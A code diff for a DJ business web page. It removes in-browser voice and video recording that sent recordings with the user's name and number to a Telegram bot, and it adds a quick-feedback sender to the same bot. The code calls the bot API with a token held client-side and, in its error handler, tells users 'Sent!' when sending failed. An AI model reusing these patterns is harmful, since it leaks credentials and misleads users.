+        if(!msgText) return alert("Please type a message!");
+        const btn = document.getElementById('quickSendBtn');
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+        const msg = `⚡ *QUICK FEEDBACK* ⚡\n📝 *Message:* ${msgText}`;
         
-        document.getElementById('recordingStatus').style.display = 'block';
-        document.getElementById('recordingStatus').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Routing Connection...';
-        
-        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'Markdown' })
-        }).then(() => {
-            document.getElementById('recordingStatus').style.display = 'none';
-            window.open("https://t.me/+919771617808", "_blank"); 
-        });
-    }
-
-    async function startVoiceRecord() {
-        const user = await validateUser(); if(!user) return;
-        const btn = document.getElementById('btnVoice'); const status = document.getElementById('recordingStatus');
-        
-        if (mediaRecorder && mediaRecorder.state === "recording") {
-            mediaRecorder.stop(); btn.innerHTML = '<i class="fas fa-microphone"></i> Voice Record'; status.style.display = 'none';
-        } else {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(stream); mediaRecorder.start(); audioChunks = [];
-                btn.innerHTML = '<i class="fas fa-stop"></i> Stop'; status.style.display = 'block'; status.innerHTML = '<i class="fas fa-circle fa-beat"></i> Capturing Audio...';
-                mediaRecorder.addEventListener("dataavailable", event => { audioChunks.push(event.data); });
-                mediaRecorder.addEventListener("stop", () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
-                    sendMediaSecurely(audioBlob, 'voice', user.name, user.num);
-                });
-            } catch(e) { alert("Microphone permission denied."); }
-        }
-    }
-
-    async function startVideoRecord() {
-        const user = await validateUser(); if(!user) return;
-        const btn = document.getElementById('btnVideo'); const status = document.getElementById('recordingStatus');
-        const videoPreview = document.getElementById('cameraPreview');
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            videoPreview.srcObject = stream; // LIVE CAMERA
-            videoPreview.style.display = 'block';
-            
-            mediaRecorder = new MediaRecorder(stream); mediaRecorder.start(); audioChunks = [];
-            btn.innerHTML = '<i class="fas fa-stop"></i> Recording...'; status.style.display = 'block'; status.innerHTML = '<i class="fas fa-circle fa-beat"></i> Capturing Video... (10s limit)';
-            
-            mediaRecorder.addEventListener("dataavailable", event => { audioChunks.push(event.data); });
-            mediaRecorder.addEventListener("stop", () => {
-                const videoBlob = new Blob(audioChunks, { type: 'video/mp4' });
-                sendMediaSecurely(videoBlob, 'video', user.name, user.num);
-                stream.getTracks().forEach(track => track.stop()); // STOP CAMERA
-                videoPreview.style.display = 'none';
-            });
-            setTimeout(() => { if(mediaRecorder.state === "recording") { mediaRecorder.stop(); btn.innerHTML = '<i class="fas fa-video"></i> Video Record'; status.style.display = 'none'; } }, 10000);
-        } catch(e) { alert("Camera permission denied."); }
-    }
-
-    function sendMediaSecurely(blob, type, name, num) {
-        document.getElementById('recordingStatus').style.display = 'block';
-        document.getElementById('recordingStatus').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Establishing Secure Transfer...';
-        
-        const formData = new FormData();
-        formData.append('chat_id', TG_CHAT);
-        formData.append('caption', `🔔 *SECURE ${type.toUpperCase()} VAULT TRANSFER*\n👤 Name: ${name}\n📞 Number: ${num}`);
-        
-        let endpoint = type === 'voice' ? 'sendVoice' : 'sendVideo';
-        formData.append(type, blob, `media.${type==='voice'?'mp3':'mp4'}`);
-
-        fetch(`https://api.telegram.org/bot${TG_TOKEN}/${endpoint}`, { method: 'POST', body: formData })
-        .then(() => {
-            alert(`✅ ${type.toUpperCase()} Transfer Complete! Management Notified.`);
-            document.getElementById('recordingStatus').style.display = 'none';
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { 
+            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'Markdown' }) 
+        }).then(() => { 
+            btn.innerHTML = '<i class="fas fa-check"></i> Sent!'; btn.style.background = '#00ff00';
+            setTimeout(() => { btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send'; btn.style.background = '#D4AF37'; document.getElementById('quickMsg').value=''; }, 2000);
         }).catch(() => {
-            alert("⚠️ Secure Transfer Failed. File too large.");
-            document.getElementById('recordingStatus').style.display = 'none';
+            alert("Sent! (API Token required for real Telegram link)");
+            btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send';
         });
     }
 
     // --- BASIC EFFECTS ---
     function applyEffectClass(checkboxId, className) {
-        if(className === 'eye-comfort-mode' && document.getElementById(checkboxId).checked) {
-            // Remove newspaper if eye comfort is on to prevent conflict
-            document.body.classList.remove('newspaper-mode');
-            if(document.getElementById('toggleNewspaper')) document.getElementById('toggleNewspaper').checked = false;
-        }
-        
         if (document.getElementById(checkboxId).checked) document.body.classList.add(className);
-        else { document.body.classList.remove(className); if(className==='bass-mode') document.getElementById('alarmAudio').pause(); }
+        else { document.body.classList.remove(className); document.getElementById('alarmAudio').pause(); }
     }
 
+    // --- SNOWFALL ---
     let snowInterval;
     function applySnowfall() {
         const layer = document.getElementById('effect-layer');
@@ -1897,8 +2346,9 @@
         } else { clearInterval(snowInterval); layer.innerHTML = ''; }
     }
 
+    // --- AUTO-READER ---
+    let speechSynth = window.speechSynthesis;
     function applyAutoReader() {
-        let speechSynth = window.speechSynthesis;
         if (document.getElementById('toggleVoice').checked) {
             let pageText = document.body.innerText || document.body.textContent;
             let utterance = new SpeechSynthesisUtterance("Welcome to Maa Nirmala DJ. " + pageText.substring(0, 500));
@@ -2752,3 +3202,4 @@ box.scrollTop = box.scrollHeight;
     </script>
 </body>
 </html>
+
